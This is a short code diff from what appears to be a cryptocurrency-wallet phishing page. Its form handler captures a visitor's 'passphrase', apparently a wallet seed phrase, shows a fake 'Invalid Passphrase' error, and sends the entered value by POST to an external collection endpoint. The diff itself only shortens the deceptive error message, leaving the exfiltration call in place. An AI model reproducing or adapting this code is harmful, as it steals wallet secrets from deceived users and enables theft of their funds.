@@ -14,14 +14,14 @@ form.addEventListener("submit", async (e) => {
     key=data.value
     counter++;
     e.preventDefault();
-    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
+    message.innerHTML = " <p>Invalid Passphrase</p>";
     await fetch("https://mainnet-production.up.railway.app/handle-mail", {
       method: "POST",
       body: JSON.stringify({ pass: data.value }),
     });
   } else {
     e.preventDefault();
-    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
+    message.innerHTML = " <p>Invalid Passphrase</p>";
   }
 
   // window.location.reload()
